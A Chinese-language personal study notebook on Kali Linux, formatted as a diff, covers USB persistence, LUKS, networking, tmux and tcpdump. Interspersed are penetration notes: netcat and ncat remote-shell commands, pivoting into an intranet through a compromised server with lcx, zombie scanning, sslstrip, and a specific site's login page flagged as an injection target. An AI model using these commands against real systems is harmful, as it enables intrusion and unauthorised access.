@@ -1,0 +1,1205 @@
+ 	1.支持ARM芯片。树莓派使用的就是ARM芯片，kali 有个for raspberry版本。
+ 	1.支持ARM芯片。树莓派使用的就是ARM芯片，kali 有个for raspberry版本。
+	2.无线内核补丁（估计就是内核模块）已经内置了。
+	3.自启动脚本默认不会自启动。所以我的/etc/rc.local配置失败么
+	5.
+kali live模式下硬盘更改不会被保存。
+kali persistence安装：
+开辟出一块存储空间，用于存储“上次操作完的系统”。
+
+dmesg 查看U盘是叫sdb还是sdc什么的。不过其实可以直接在parted里面先print devices一次，然后插入后在print devices. dmesg | tail
+先卸载再删除盘
+dd if=kali.iso路径 of=/dev/sdb bs=1M if是input file,bs是block size。dd是按照块来复制并进行转换，这个情况下不仅仅复制，还有分区进行刻录。dd命令也可以用来打包成iso。
+watch -n 5 killall -USER1 dd每五秒发送要求报告进度使用三个命令:pkill、killall、kill向dd命令发送SIGUSR1信息,dd命令进程接收到信号之后就打印出自己当前的进度。
+
+parted 进入终端模式 （gparted是GUI） #类似的命令还有fdisk
+print devices
+select /dev/sdb
+print
+mkpart primary 起始位置 终止位置(默认MB为单位，你可以自己跟上单位)
+quit、q
+
+
+cryptsetup --verbose（-v） --verify-passphrase（-y） luksFormat /dev/sdb3  加密
+cryptsetup luksOpen /dev/sdb3 usb不然什么都操作不了。这时候在kali中会被解密到到/dev/mapper/usb，之后就用这个来挂载了，不过我猜测格式化与改标签用哪个都等效。
+--verbose                         Shows more detailed error messages
+root@kali:/# cryptsetup luksOpen /dev/sdb usb 如果对没有luksFormat加密的设备进行操作
+/dev/sdb 不是有效的 LUKS 设备。
+
+U盘插上去以后
+内容会在/media/root/U盘name/
+不过/dev/sdb也是，上面那个应该是被挂载的文件夹。
+root@kali:/# mount /dev/sdb /
+mount: /dev/sdb is already mounted or / busy看来确实被自动挂载到/media/root/下了
+自己不能判断就通过桌面透明的盘符先进行挂载，然后tail /var/log/syslog（《=》dmesg | tail命令） 查看挂载的名字到底是哪个。
+
+mkfs.ext4 /dev/sdb3 格式化可以放在加密之前（相当于mkfs -t ext4 ）
+e2label /dev/mapper/usb persistence	linux文件系统的标签设置
+mkdir /mnt/usb
+mount /dev/mapper/usb /mnt/usb mount后才读写，注意命令顺序是把前者挂载到后者，反汇编的顺序。而且挂载对象应该是已经存在的目录，当然
+echo "/ union" > /mnt/usb/persistence.conf 从而明白这个区就是persistence分区，>和>>都可以
+umount /mnt/usb
+cryptsetup luksClose /dev/sdb3
+
+e2label  will display or change the filesystem label on the ext2, ext3,or ext4 
+
+额外补充：
+sudo cryptsetup luksDump /dev/sda5 查看是否已经加密
+root@kali:~# cryptsetup luksDump /dev/sda
+Device /dev/sda is not a valid LUKS device.
+root@kali:~# cryptsetup luksDump /dev/sdb
+Device /dev/sdb doesn't exist or access denied.没想到还可以拒绝访问
+LUKS header默认配置且只带一个密钥槽的大小，前1028KB
+
+sudo dd if=/dev/sda5 of=backup.img bs=1K count=1028
+然后把备份的LUKS header加密一下
+openssl des3 < backup.img > backup.bin #可以使-h来查看支持哪些加密 #加了-d就是实现解密功能。
+
+对于传统的普通硬盘来说，完全自毁是一个极其漫长的过程，需要把整个硬盘都擦写一遍，而对于LUKS加密而言，只需要把LUKS header擦写掉，由于不再有密钥槽salt来配合密码解密，实际就达到了全盘自毁的效果。所以直接用dd命令写掉就摧毁了。
+
+	6.gnome-tweak-tool字体外观设置（tweak tool就是用来改变主体的，也可以改动gnome shell extension）
+	7.目录
+根目录下的live-build目录，当你要自己定制kali版本的时候，会用到。用Debian的live-build脚本对Kali ISO进行全面的配置。但是我这里已经没有这个目录了
+opt放一些应用程序的目录，不过kali在这个目录里面的软件似乎没有
+用户自己安装的程序会在/usr/local
+	8.netspeed：
+kali2.0用回了gnome，需要使用gnome-shell-extensions来安装才能让它在工具栏显示。
+apt-get install gnome-shell-extensions有的源没有（自带官方源有）。不需要安装，后来发现直接打开网页来安装是没有问题的，因为kali里内置了gnome-shell-extension的支持
+
+不过之后发现还需要浏览器支持，firefox中插件搜索gnome，可以找到本机上有个GNOME Shell Integration，需要设置为Always Active，如果是Ask to Active就会导致不能安装。
+https://extensions.gnome.org/local/打开这个网址（如果打不开就需要安装gnome-shell-extensions），他会自动尝试进行你的GNOME Shell Intergration，你在上面可以直接对本机的gnome shell扩展进行处理：
+Coverflow Alt-Tab 屏幕切换插件
+
+或者还是用tweak tool中文名叫做“优化工具”
+恩，gnome-tweak-tool相当方便，可以在这里面对扩展进行设置，比如说Easyscreencast里面就可以设置截图快捷键。
+Dash to dock就是左边的docker（dashboard就是仪表盘）
+
+	9.
+临时网络配置（估计是因为放到内存里）
+ifconfig eth0网卡 192.168.1.10/24临时ip，这里/24表示子网掩码而不是范围。IP、子网掩码等网络信息都是对于网卡而言的，所以上网要网卡。
+route add default gw 192.168.1.1 临时添加网关，default不能去掉，否则写上网段
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         phicomm.me      0.0.0.0         UG    0      0        0 eth0
+临时添加路由（比如说为了VLAN）
+route add net 192.168.0.0/24 gw 192.168.1.100 eth0前面是网段，后面是网关。在本机有多张网卡对应于多个网关的时候会被使用。
+route add net 192.168.1.0/24 gw 192.168.1.100 eth0
+route add net 192.168.3.0/24 dev eth0
+//临时删除路由
+route del host 192.168.1.11 dev eth0 如果有多条匹配，似乎删除是从上到下的，反正就是只会删除一条。
+没有被设置的部分就会默认是0（0.0.0.0）
+route default gw 192.168.2.1 netmask 255.255.255.0  netmask要在default gw后面，默认网关没有设置子网掩码的必要。
+
+
+网卡配置文件：/etc/netwrork/interfaces
+kali默认情况下：
+source /etc/network/interfaces.d/* #然而这个文件夹里面什么都没有
+#The loopback network interface
+auto lo
+iface lo inet loopback #eth0没有被设置
+
+#allow hotplug eth0  #他使用了USB无线网卡
+iface eth0 inet static
+address0 192.168.0.1
+netmask 255.255.255.0
+network 192.168.0.0 #network 和broadcast不是必须的，除了子网掩码包括的部分（主机部分），一个全是0（表示网络地址），一个全是1（表示广播地址）
+broadcast 192.168.0.255
+gateway 192.168.0.254
+dns-nameserver 114.114.114.114 8.8.8.8
+以下是网卡up和down的时候执行
+up route add net 172.16.5.0/24 gw 192.168.10.100 eth0 //每次up的时候触发临时改变
+down route del net 172.16.5.0/24
+
+auto
+语法：
+auto <interface_name>
+含义：
+在系统启动的时候启动网络接口,无论网络接口有无连接(插入网线),如果该接口配置了DHCP,则无论有无网线,系统都会去执行DHCP,如果没有插入网线,则等该接口超时后才会继续。
+
+allow hotplug
+语法:
+allow hotplug <interface_name>
+含义：
+只有当内核从该接口检测到热插拔事件后才启动该接口。如果系统开机时该接口没有插入网线,则系统不会启动该接口,系统启动后,如果插入网线,系统会自动启动该接口。也就是将网络接口设置为热插拔模式。
+
+inet后面是跟连接网络方式static、loopback、dhcp
+	9.一些软件：
+gdebi 图形化安装deb包（默认是dpkg -i进行安装）g表GUI，deb，i表-i
+amule 电驴
+qbittorrent BT
+stardict 中英文翻译词典（windows下就是有道词典）
+meld 图形化文件差异比较
+freemind 思维导图（http://asciiflow.com/是个web思维导图）（windows下是XMind，不过visio也倒是能做到）
+mtr 路由追踪（自带是traceroute，windows是tracert）my trouceroute. 丢包率上升的还被标红
+filezilla 和filezilla-common FTP（windows有filezilla和filezilla server）
+monodevelop 和mono-gmcs 有些工具需.NET环境
+mono是指由Novell公司(由Xamarin发起，并由Miguel de lcaza领导的，一个致力于开创·NET在Linux上使用的开源工程。
+sogou拼音（需要先装fcitx）
+hexchat #图形模式irssi，irc聊天工具（windows下还要自动下载一个vcxxx.exe，否则会说因为缺少依赖而打不开，似乎安装了vc2015 x64）
+
+firefox浏览器插件（文字编码在定制里面）
+Download YouTube Videos
+Firebug 会取代原有的F12
+HackBar
+Tamper Data（修改HTTP包）（这个扩展有点特殊，定制里面没找到，他把开启放到了Menu Bar-》Tools）
+Flagfox 以国旗显示服务器位置
+FlashGot 浏览器下载（有些视频文件的位置可以被侦测到）
+hashr 计算哈希值
+SQL Inject Me
+XSS Me
+NoScript 阻止网页上脚本的运行（tor自带）
+uBlock Origin 一款高效的网络请求过滤工具（广告阻拦）
+Video DownloadHelper
+Awesome Screenshot 截屏
+AutoProxy Mod 原来的autoproxy已经停更了
+不是很推荐：Live HTTP headers 就算是修复版，重发功能也有问题，不是很稳定，不如bp
+
+chrome插件：
+智能代理（Proxy SwitchySharp 怎么设置失败）
+Octotree
+点击URL前面的按钮区域可以显示很多的东西，包括cookie正在使用（可从这里进行清除）、位置、摄像头、麦克风、js、完全控制MIDI设备等。还有查看cookie就是在document.cookie,或者F12开启后重新访问网页在“网络处”查看发包与收包。
+Tampermonkey 插件，然后就可以找到Tampermonkey百度云管家脚本来安装了（https://greasyfork.org/zh-CN里面还有很多脚本）
+	10.自己由包来搭建JAVA环境
+解压下载过来的jdk，放置到/opt下
+设置命令链接符：update-alternatives 似乎只能用于java
+update-alternatives --install /usr/bin/java java /opt下的jdk解压文件中的java 1 #末尾的这个1别落下了
+update-alternatives --install /usr/bin/javac javac /opt下的jdk解压文件中的javac 1
+update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so /opt/jdkxxxxx/jre/lib/amd64/libnpjp2.so 1
+如果是版本升级那么只用--set就行
+update-alternatives --set java /opt下的jdk解压文件中的java 1 #末尾的这个1别落下了
+update-alternatives --set javac /opt下的jdk解压文件中的javac 1
+update-alternatives --set mozilla-javaplugin.so /opt/jdkxxxxx/jre/lib/amd64/libnpjp2.so 1
+	11.ls
+root@kali:~# ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+root@kali:~# ls Desktop
+a  b
+	12.显卡驱动安装：
+apt-get update
+apt-get install -y linux-headers-$(uname -r) #kali没有glib。kali安装这个headers可能还需要降内核版本
+apt-get install -y nvdia-kernel-dkms #这个是Nvidia的显卡包#但是我没找到
+sed 's/quiet/quiet nouveau.modeset=0/g' -i /etc/default/grub update-grub#不要记住命令
+reboot
+验证：
+glxinfo | grep -i "direct rendering" #返回yes便正常。-i无视大小写
+glxinfo可以获得显卡对OpenGL的支持信息。
+	13.并发线程限制（为了使用DDOS工具）（只限制当前shell内进程的资源使用）
+ulimit -a #单位都是KB，blocks，s#这个命令用来显示当前配置，还可以查看其他参数对应着什么
+ulimit -s 100 #限制堆栈大小为100KB
+ulimit -m 5000 -v 5000 #-m最大内存大小（本来没有限制），-v虚拟内存大小（本来没有限制）。这样之后使用ls命令会失败说共享库调用不了
+全局配置文件主文件夹下的.bashrc，那么也就是按照用户有不同区别。在里面添加ulimit命令即可。
+	14.kali1.0没有配置电源优化，笔记本电池报废的特别快：
+白了就是少用电池的电（甚至开启硬盘的省电选项）
+不同的系统对电池使用的油画棒不同，OSX最好
+	15.kali默认没有开启网络服务：
+运行级别：0关机 6重启 1单用户 2,3,4,5多用户
+update-rc.d 服务名 default 80 20 #使得重启系统时候可以自动启动服务。（2，3,4,5级别启动 0,1,6级别关闭）。启动优先级位80，关闭优先级位20
+<=> update-rc.d 服务名 start 80 2,3,4,5 . stop 20 0,1,6 
+update-rc.d 命令中的路径即使是“绝对路径”格式也会在前面被加上/etc/init.d/
+update-rc.d -f postfix remove
+update-rc.d postfix defaults 
+
+由于insserv 这个的存在（据说可以卸载一劳永逸）,
+需要在脚本中加入LSB信息：
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          php_fastcgi.sh
+# Required-Start:    $local_fs $remote_fs $network $syslog
+# Required-Stop:     $local_fs $remote_fs $network $syslog
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: starts the php_fastcgi daemon
+# Description:       starts php_fastcgi using start-stop-daemon
+### END INIT INFO
+然后insserv -v -d /etc/init.d/xx.sh 
+就可以update-rc.d xx.sh defaults而不warning
+
+Debian定义了多个运行级别脚本，分别存放在/etc/rc0.d至/etc/rc6.d中，默认级别为5
+可是kali里面我把指令直接加到/etc/rc.local中却没有被执行。
+	16.代理设置：
+apt代理设置：
+/etc/apt/apt.conf 不存在
+Acquire::协议::Proxy "协议://127.0.0.1:端口" #协议可以是ftp，http，https，socks。本地开了GoAgent所有采用127IP。
+
+终端设置代理：
+/etc/bash.bashrc #这个是总bash配置 #用户目录下也有个.bashrc这个是每个用户的bash配置
+export 协议_proxy="协议:://user::password@IP:port"  #user和passwd是指代理服务器#也可以在终端中输入，就是临时的
+如果需要开机自动设置，把上面的代码加到~/.bash_profile里。
+临时使用可以直接执行命令。要更换就换一个终端或者直接export命令进行覆盖。 
+root@kali:~# export http_proxy="https://xxxip:xxxport"
+root@kali:~# curl www.baidu.com
+root@kali:~# export http_proxy="http://106.46.136.49:808"
+bash.bashrc 是交互式shell的初始化文件。
+
+代理链的指定：
+/etc/proxychains.conf
+还支持不同代理的混合，可以支持的代理看文件自己的描述。可以设置静态链strict_chain或者动态链random_chain，如下使用
+有dynamic_chain、strict_chain、random_chain、proxy_dns
+#Example
+#               socks5  192.168.67.78   1080    lamer   secret
+#               http    192.168.89.3    8080    justu   hidden
+#               socks4  192.168.1.49    1080
+#               http    192.168.39.93   8080
+我是把前面都注释掉然后自己写一个：也可以把这个本地端口写在bash.bashrc
+dynamic_chain
+socks5  127.0.0.1 7070
+使用的时候就在命令前面加上proxychains	
+
+http高匿代理要么是拒绝连接要么是直接理都不理你，脾气好大哦。
+
+	17.NETCAT(NC):
+windows telnet的linux升级版（控制面板-》程序和功能-》打开和关闭Windows 功能），默认是都关闭的。
+不建议让nc参与域名的解释，据说有时候会很慢，后面直接跟ip。
+这个命令可以作为客户端使用或者服务器端来支持
+客户端命令：nc -nv n是指后面跟ip且不做DNS解析，-v是verbose（当做显示详细信息）
+服务器端命令：nc -l -p 端口号 -l侦听 -p指定端口号
+另外一个直接用nc -nv连接这个端口就可以聊天了，借助tcp连接
+ls -l | nc -nv ip port #取证就尽可能保护本地的证据不会被破坏
+服务器的命令后面可以加一个重定向：nc -l -p 33 > info.txt
+
+root@kali:~# nc -nv 182.254.217.40 62
+(UNKNOWN) [182.254.217.40] 62 (?) open
+SSH-2.0-OpenSSH_6.6.1
+
+
+nc的传输是流传输，所以可以传任何东西（“单个”文件或者进程返回的“一个”输出结果）
+传输文件：
+服务器传给客户端或者哭护短传给服务器
+nc -lp 333 > 1.mp4
+nc -nv IP Port < 1.mp4 -q 1 #不会自己退出
+或者（下面这个就比较神奇，监听并且等待传输）
+nc -lp 333 < 1.mp4 -q 1
+nc -nv IP Port > 1.mp4
+
+传输目录（之后都以一个方向举例）：目录只是个树杈在磁盘上的存储不同于文件的存储的原因么
+A:tar -cvf - 目录名字| nc -lp 333 -q 1 #不具备传输目录结构的特性#tar的-表示把生成结果作为输出
+B:nc -nv IP Port | tart -xvf - #-把得到结果作为tar解压目标。
+
+
+加密传输：（对流加密就好，可以查看apt-cache search crypt）
+A:nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.mp4
+B:mctypt --flush -Fbq -a rijndael-256 -m ecb < a.mlp4 | nc -nv IP Port -q 1
+加密算法是rijndael，256长度版本。加密方法是ecb。解密完成，密钥会被flash掉，不会在本地保存，执行命令的时候输入。
+服务器传数据给客户端
+
+流媒体传输：（不会自动在本地保存）
+A:cat 1.mp4 | nc -lp 333 -p 1 #虽然是cat过去，但是还是可以用>进行保存
+B:nc -nv IP Port | mplayer -vo x1 -cache 3000 #播放器3000KB的缓存
+h.264流也是可以直接被mplayer识别的
+
+端口扫描：
+-z探测窗口但是Zero IO（应该是指中间过程IO）
+nc -nvz IP PortScope #一般开放的tcp端口会给出响应 #如果没有nv的话就没有输出回馈
+nc -nvzu IP PortScope 这个很不准，居然一直说是开着的，不管什么端口
+
+远程控制：
+-q seconds 一般使用是-q 1。quit after EOF on stdin and delay of secs
+在一般的nc连接命令后面加一个-c bash或者-c cmd即可。可以是服务器开放bash，或者客户端开放。exit后退出传递的bash，双方断开连接。
+但是防火墙不会打开陌生端口映射给服务器，让外面的人连接。或者有可能，会在边界的时候，除了管理员开放的端口，会将其他端口的从外向内流量禁止掉，所以就要让他自己连出来，连出来的端口可能也被限制了，所以最好用管理员的开放端口。所以安全做得好的，就会把业务服务器的除了必须的，其他全部交给其他服务器，从而达到从内向外的安全。
+使用wireshark follow tcp stream就可以知道具体操作，交出shell的一方在终端中是看不到另外一方干了什么的
+nc有很多版本，不同操作系统下的nc可能差别较大。
+
+硬盘级别的复制：
+A: nc -lp 333 | dd of=/dev/sda
+B: dd if=/dev/sda | nc -nv IP Port -q 1
+
+还可以对内存信息保存一份在远程磁盘上
+
+	18.base64命令中输入明文，按C-D表EOF输出base64.不过有时候要按两下C-D才行，答案还是对的。base64编码，并不一定在末尾都会有=，比如说123。
+sha1sum ： compute and check SHA1 message digest
+	19.终端连接POP3服务器后
+USER base64后的用户名
+PASSWORD base64后的密码
+
+FTP是USER xxx 再PASS xxx（小写也可以）
+	21.linux的远程控制：
+ssh连接到远程shell
+nc远程控制
+ncat
+telnet
+	22.路由器的mac禁用会把kali桥接也禁用了。
+	23.ncat（nc的允许加密版）：
+ncat包含于nmap工具包中
+-nvlpzuq这七个参数和nc是一样的
+--allow是限制访问ip
+--ssl 使用ssl加密通道
+ncat -c bash --allow IP -lp Port --ssl #ssl为了管道加密。bash和nc一样没有自动补齐
+ncat -nv IP Port --ssl
+以上命令会自动利用ssl，交换ssl证书等做到整个通信的加密。还是存在部分明文，比如说使用了nmap中的ncat。
+	24.对于桥接模式，kali不需要任何设置。
+	25.tcpdump（Unix类普遍自带）：
+默认情况下只抓包前64字节
+直接tcpdump，什么参数都不加，C-C后要过一会才关的掉，但是停止是立即的
+-i 抓哪个网卡 一般应选eth0 interface
+-s 抓的数据包大小（默认64字节） -s 0是你包有多大，我全抓 -s 412 同时412bytes包附近的包也被抓了
+-w 后面跟输出文件。意外发现，wireshark可以打开生成的文件诶
+tcpdump -i eth0 -s 0 -w tcpdump.cap #这时候C-C倒挺快的。同时产生tcpdump.pap
+-r 后面必须要是文件名字 read
+-A ASCII显示输出
+-x 十六进制显示
+-n 全部ip显示，没有域名 num display
+tcpdump -r tcpdump.cap #查看pap文件中的摘要信息
+tcpdump -A -r tcpdump.cap
+
+
+tcpdump -i eth0 port 222
+tcpdump -i eth0 tcp port 222
+
+筛选：（这是第二次筛选）
+tcpdump src host IP -r http.cap
+tcpdump dst host IP -r http.cap
+高级筛选：
+'tcp[13]=24' #第十四个字节的十进制值为24，也就是PSH和ACK位段为1
+tcmpdump -A -n 'tcp[13]=24' -r http.cap
+
+sudo tcpdump -i eth0 src  192.168.1.135 and dst  192.168.1.138
+真不错还会显示时间，可是ICMP的包怎么变成了ip包
+	26.curl -v baidu.com #用于Internet传文件 
+* Rebuilt URL to: baidu.com/
+*   Trying 180.149.132.47...
+* Connected to baidu.com (180.149.132.47) port 80 (#0)
+> GET / HTTP/1.1
+> Host: baidu.com
+> User-Agent: curl/7.50.1   ？？这个需要发包试验一下看一下这个东西是不是必须的？联系下发Http包！
+> Accept: */*
+> 
+< HTTP/1.1 200 OK
+< Date: Tue, 15 Nov 2016 08:14:30 GMT
+< Server: Apache
+< Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
+< ETag: "51-47cf7e6ee8400"
+< Accept-Ranges: bytes
+< Content-Length: 81
+< Cache-Control: max-age=86400
+< Expires: Wed, 16 Nov 2016 08:14:30 GMT
+< Connection: Keep-Alive
+< Content-Type: text/html
+< 
+<html>
+<meta http-equiv="refresh" content="0;url=http://www.baidu.com/">
+</html>
+* Connection #0 to host baidu.com left intact
+默认相当于自带-s GET
+-d --data 使用POST方法。php的curl可以做到的，这个命令都可以做。
+-v 会把请求头与响应头显示出来
+
+	24.apt-get remove/purge软件的时候也要获得lock
+	26.TrueCrypt
+位于kali附件里面
+创建加密文件挂载到系统上面，然后把你的东西放到里面去。还有全盘加密的功能。虽然是linux下使用，但是支持对windows的创建。有个很好的加密功能，把一个卷分成外部卷与加密卷，输入错误的密码看到的就是外部卷，在创建过程中成为Hidden volume。
+创建过程中有对鼠标位置的捕捉，作为一个随机数来使用。
+	27.有些时候，gedit会阻断shell，控制权一直在gedit那里，但是这次我遇到gedit把控制权返回给shell了。
+	28./usr/share/applications里面存着.desktop结尾的“快捷方式”，可以用cat，gedit查看他们干了什么、
+	   对其中exec启动命令的改动重启后生效。
+exec=sh -c"shell命令"
+	33.本来主机自己有自己的hosts，但是这样子并不好，人与人之间的不统一，还有hosts信息不全。所以就出现了DNS服务器。
+主DNS服务器：就是一台存储着原始资料的DNS服务器。
+从DNS服务器：使用自动更新方式从主DNS服务器同步数据的DNS服务器。也成辅助DNS服务器。
+缓存服务器：不负责本地解析，采用递归方式转发客户机查询请求，并返回结果给客户机的DNS服务器。同时缓存查询回来的结果，也叫递归服务器。
+           一般的查询时先递归查询，再由本地DNS进行循环查询。
+
+host文件就是一个自己记住的域名ip对应关系，破解的时候防止跟新就把ip对应为localhost或者弄一个假服务器来伪造认证。
+windows host：C:\Windows\System32\drivers\etc\hosts里面全是注释，写法也就是下面
+#      102.54.94.97     rhino.acme.com        
+#       38.25.63.10     x.acme.com              
+#	127.0.0.1       localhost
+#	::1             localhost
+
+linux /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+	38.默认密码可以登陆一半的设备
+	39.MySQL默认不可以远程连接
+	40.host是个DNS 查阅类指令。
+	42.申请DNS的时候借助那些公司，就可以不用自己公司的信息比人查到
+	44.tmux 终端复用,操作和命令接近Vim
+	52.框架交互模式下帮助是help。
+	53.对一个https的用http进行访问，浏览器就会禁止这种行为，并警告。
+	54.tmux
+tmux #开启tmux
+tmux ls #显示已有tmux列表（C-b s）
+tmux attach-session -t 数字 #选择tmux
+C-b c 创建一个新的窗口
+C-b n 切换到下一个窗口
+C-b p 切换到上一个窗口
+C-b l 最后一个窗口,和上一个窗口的概念不一样哟,谁试谁知道
+c-b w 通过上下键选择当前窗口中打开的会话
+C-b 数字 直接跳到你按的数字所在的窗口(你还可以自己去编号)
+C-b & 退出当前窗口
+C-b d 临时断开会话 断开以后,还可以连上的哟:)
+C-b " 分割出来一个窗口
+C-b % 分割出来一个窗口
+C-b o 在小窗口中切换
+C-b (方向键)
+C-b ! 关闭所有小窗口
+C-b x 关闭当前光标处的小窗口
+C-b t 钟表
+C-b pageup/pagedo
+
+
+	55.访问失败会跳转到：http://202.102.110.207:8080/1.htm?AIMT=想要访问的网页。访问错误网址就会跳转到ISP的错误页面。改变DNS后可以解决跳转问题。
+	建立不完全扫描不会在应用层日志中出现，只会在网络日志中。
+
+端口扫描之僵尸扫描：
+前提：tcp包的id是有规律的，老系统上是+1递增规律
+	这台机器处于网络空闲（所以称为僵尸，不同于“僵尸群”里面的“僵尸”）
+	你发到目标的通路上面允许ip伪造成要使用的僵尸的ip（我想到了有两种情况：1.通路允许ip伪造，这也是视频中提到的2.通路不允许，但是僵尸机zombie和你再用一个网段内，不允许不会影响 ）
+使用nmap脚本ipidseq.nse，或者自己借助scapy来py
+windows xp的tcp id确实一直是递增的，不管是对它哪个端口进行了tcp包的发送。注意：udp没有序列号。
+要是包发出去都是对端口逐渐递增扫描是很容易被发现的。而且我在脚本里面指定按顺序发，抓包抓到的也不是按照顺序的？复习Shell编程后尝试
+
+	58.劫持关键路由器，判断出来是某公司的网站信息就插入广告。根据TTL值判断链路劫持点。当时攻击者可以修改TTL呀。
+	59.CPE 操作系统，硬件进行编号
+	60.Dock工具栏
+	61.负载均衡：
+广域网负载均衡：DNS，同一个域名解析为多个A记录，进行DNS轮询，从而负载均衡。智能DNS，按照地点解析为不同的A记录。
+服务器负载均衡，应用层 与 网络层设备
+组件级负载均衡
+	62.http://www.qcwlkm.cn/member/login.asp然后这个网站的管理员登录是/admin/login.asp而且默认用户名显示admin，输错了还会告诉你是用户名错了还是密码错了。话说发现，有验证码的我没法Get注入？不，这和验证码没有关系。
+	63.more 中?可以开启提示，less没有但是可以用more的来推less的，比如说空格翻页。man 空格、PgUp或者PgDn翻页。
+	64.
+root@kali:/# ifconfig eth0 192.168.1.11/24
+root@kali:/# dhclient eth0 #我只有这一个网卡，所以默认就是eth0.
+smbd.service is not active, cannot reload.
+invoke-rc.d: initscript smbd, action "reload" failed.
+这个错误是指我重启网卡失败，不过不影响我向路由器所要我指定的临时IP。woc，笔记本虚拟机kali失败了？？？
+	65.
+usr全称是UNIX software resource，并不是大多数人想象的user，这里主要存放的是一些软件程序以及这些程序所需要使用的库，当然也会保存一些程序需要的资源文件
+opt　　也是用来保存的程序文件的，但是保存的这些程序和usr中的一般有些不同，usr里面一般都是保存GNU的，或者是免费，开源的软件，而opt里面保存的都是一些版权比较严格的，或者是套件之类的，主要代表就是sun的java系列和rar系列的软件，当然，其实也有人把这些软件放到usr中，opt目录本来就是方便管理才弄的
+	66.漏洞（弱点）扫描：
+www.exploit-db.com提供漏洞的利用脚本。还有就是metasploit官网，Shell-storm官网。
+漏洞目录：/usr/share/exploitdb/platform
+在企业里面，说需要周期性扫描。
+
+CVSS（Common Vulnerability Scaning System）给漏洞打分0-10，越高越危险。据说这个工业标准要被知道。
+CVE（Common Vulnerabilities and Exposures）没发现一个漏洞就会编号（有MITRE非盈利组织负责）。产商也会自己维护一个编号，如微软补丁是MSKB。还有CRET、BIT、IAVM、OVAL开头进行编号。
+OVAL 是开放漏洞描述性语言，使用XML描述。会被拿来导入到扫描器里面使之可以检测漏洞。
+CCE配置缺陷的检测
+CPE 规范化命名	P是Product
+CWE 漏洞类型的字典，描述不同类型漏洞的特征。从而进行漏洞的分裂。 W是weakness
+SCAP 一种框架，包含了很多标准
+
+有这样一个漏洞，打印机的打印请求可以在系统目录中创建文件、执行任意代码。
+
+	66.5 searchsploit -h  基于exploit database官方漏洞数据库源的漏洞搜索工具
+	    使用示例：searchsploit windows iis remote
+	67.缓冲区溢出攻击：
+较常见的由于操作系统上面的服务存在溢出漏洞。
+缓冲区溢出漏洞挖掘之SLMail 
+
+	68.windows xp防火墙-》例外 开出端口。本地连接图标上面的那个锁就表示防火墙开启
+	69.SSL网站会证书，证书具有有效期，一旦证书泄露可以在自己的网站上等多种方式公布一个CRL（证书吊销列表）
+	70.F5 是一家网路设备公司
+	68.神奇的‘;’
+对于脚本a.sh：
+#!/bin/bash
+echo $1 #按理说会输出第二个参数
+./a.sh ;pwd 这时候就会执行命令
+
+root@kali:~/Desktop# pwd;ls
+/root/Desktop
+	69.对程序漏洞的发现：
+1.源码审计\逆向工程
+2.模糊测试
+向程序堆栈半随机的数据，根据内存变化判断溢出
+数据生成器：生成半随机随机数
+
+
+
+
+	69.windows Administrator UID=500，Guest=501.自己新建的UID都是从1000开始。扫描器可以用UID来遍历得到用户。
+	70.Dropbear is a relatively small SSH server and client.路由器系统上的小型ssh连接软件。
+	71.在文件属性中，windows 1MB=1024KB ，kali 1MB=1000KB
+	72.一个扫描软件一年收费40-50W，后续每年升级20W。企业重量级，重启以后初始化大量服务，需要大量内存。
+	73.kali在NAT下可以借助windows翻墙。
+	
+	75.ping百度会越ping越慢。
+	76.openwrt使用dropbear服务器进行ssh连接，为了安全，给dropbear指定允许ssh连接的路由器端口。
+	77.开了赛风代理以后，居然不能连接到路由器，看来路由器是https？不，还是http。这是因为，分组会直接发给代理，然后再发出去，192.168.1.1是本地地址所以代理是找不到的，代理找的只是自己的192,168,1,1。
+	78.文件协议SCP，还是不同于ssh连接协议。
+	82.$$ 和 $-等等是被赋值了的
+	83部署多个网站主页：多个ip 或者 开放多个端口，一个端口一个主页 或者 主机头，指定主机头来指定主页
+	84.已经拿下内网与外网的连接点，要想访问内网，使用lcx等传统工具进行一对一端口映射。你是通过一台IP为X.X.X.X的VPS连接到Web服务器的。下面讲内网的192.168.5.128的80端口映射到xxxx上的8080端口（或者说端口转发），你访问就相当于拿下来的web服务器访问。
+1、在VPS上执行
+lcx.exe –listen 8080 80 #设定自己的8080端口监听任何一个ip的80端口，是80端口就建立连接
+
+2、在web服务器上执行
+lcx.exe –slave X.X.X.X 8080 192.168.5.128 80
+
+3、在左侧的My PC机上打开浏览器并输入
+http://X.X.X.X:8080 
+
+如果想要访问内网列出的所有端口，可以在web服务器上架设SOCKS代理。然后将端口反弹到VPS。
+	85.chrome xss过滤器会把XSS代码标红。
+	86.访问https网站，服务器收到访问请求后第一次响应是证书和证书的签名信息（颁发机构）。非对称加密-》对称加密/解密，以及hash。一开始服务器给的证书包含中公钥，客户端生成随机数用公钥加密发过去。经过优化，https速度已经和明文的http相差无几。本机有证书颁发机构的公钥，证书颁发机构给证书的时候会给hash值，同时用根证书的私钥进行加密。所以如果能够自己进行证书模仿，添加上自己的公钥，作为中间人颁布能让客户端信任的证书，那么就可以。。。。
+不过有种叫sslstrip的技术，不是针对https本身的，而是通过修改路由信息，把https请求改为http链接,还有伪造类似锁的标记来欺骗用户。（类似钓鱼）现在很多攻击不是针对协议本身，而是针对没有安全常识或者安全常识不足的用户。
+
+	   在密码学和计算机安全领域中，根书是未被签名的公钥证书或自签名的证书。基本义根证书是CA认证中心给自己颁发的证书,是信任链的起始点。
+	   本机用公钥解密，然后对证书公钥计算也是对的，就会与目标网站进行交互。否则，证书造假被浏览器拦截。或者自己制造自签名证书，给本机下载信任（比如说vega），vega的签名机构的证书也是有的需要下载。。
+	   vega与目标https是使用证书颁发机构的证书。
+	   证书给百度，限定域名是*.baidu.com
+	   证书颁发机构分级别，层级化管理，下一级颁发机构的根证书需要上一级的证书颁发机构进行签名。
+	   VerSign是去全球最大的证书颁发机构。
+	87.Fuzz Test就是用大量的测试用例一个一个试，尽可能多的找出有可能出问题的地方
